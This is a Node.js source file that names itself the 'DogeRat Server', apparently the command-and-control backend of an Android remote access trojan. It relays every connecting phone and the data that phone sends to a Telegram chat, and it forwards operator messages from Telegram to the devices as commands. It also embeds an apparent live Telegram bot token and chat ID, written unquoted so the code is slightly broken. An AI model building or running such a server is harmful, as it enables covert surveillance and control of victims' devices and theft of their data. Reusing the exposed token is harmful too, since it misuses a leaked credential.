const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// ==========================================
// YAHAN APNA TOKEN AUR CHAT ID DAALEIN
const TOKEN = 9114612735:AAETz5dDGETjGuJ48wpOPbWap8Hh1X5RBFI
const CHAT_ID = 6323510018
// ==========================================

const bot = new TelegramBot(TOKEN, { polling: true });

app.get('/', (req, res) => {
    res.send('DogeRat Server is running perfectly!');
});

io.on('connection', (socket) => {
    console.log('A device connected: ' + socket.id);
    
    // Jab koi phone connect ho toh Telegram par message bhejein
    bot.sendMessage(CHAT_ID, `🔴 New Device Connected!\nID: ${socket.id}`);

    // Phone se aane wala data Telegram par bhejein
    socket.on('message', (data) => {
        bot.sendMessage(CHAT_ID, `Message from Device:\n${data}`);
    });

    // Telegram se aane wala command phone ko bhejein
    bot.on('message', (msg) => {
        if (msg.text) {
            socket.emit('command', msg.text);
        }
    });

    socket.on('disconnect', () => {
        bot.sendMessage(CHAT_ID, `🔴 Device Disconnected: ${socket.id}`);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server listening on port ${PORT}`);
});
